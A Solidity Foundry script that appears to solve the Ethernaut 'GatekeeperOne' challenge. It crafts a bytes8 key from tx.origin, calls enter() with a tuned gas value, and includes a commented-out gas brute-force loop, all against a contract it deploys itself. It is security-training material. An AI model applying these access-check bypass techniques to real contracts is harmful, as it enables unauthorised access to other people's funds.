// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GateOneExploit {
    function attack(address _gateKeeperOne) external {
        GatekeeperOne gatekeeperOne = GatekeeperOne(_gateKeeperOne);
        // Get the last 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        
        // Create the key:
        // 1. Start with the last 2 bytes (origin16)
        // 2. Add zeros in the middle (satisfying condition 1)
        // 3. Add a 1 in the most significant bit (satisfying condition 2)
        bytes8 key = bytes8(uint64(origin16) | (1 << 63));
        
        // Let's see the key in hex
        console.logBytes8(key);
        bool success = gatekeeperOne.enter{gas: 802986}(key);
        // for (uint256 i=0; i< 8191; i++) {
        //     try gatekeeperOne.enter{gas: 800000 + i}(key) returns (bool success) {
        //         console.log("Success:", success);
        //         console.log("Gas:", i);
        //     } catch Error(string memory reason) {
        //         // console.log("Failed with reason:", reason);
        //     } catch {
        //         // console.log("Failed without reason");
        //     }
        // }
    }
}

contract DeployGatekeeperOne is Script {
    function run() public {
        vm.startBroadcast();
        GatekeeperOne gatekeeperOne = new GatekeeperOne();
        GateOneExploit exploit = new GateOneExploit();
        exploit.attack(address(gatekeeperOne));
        vm.stopBroadcast();

    }
}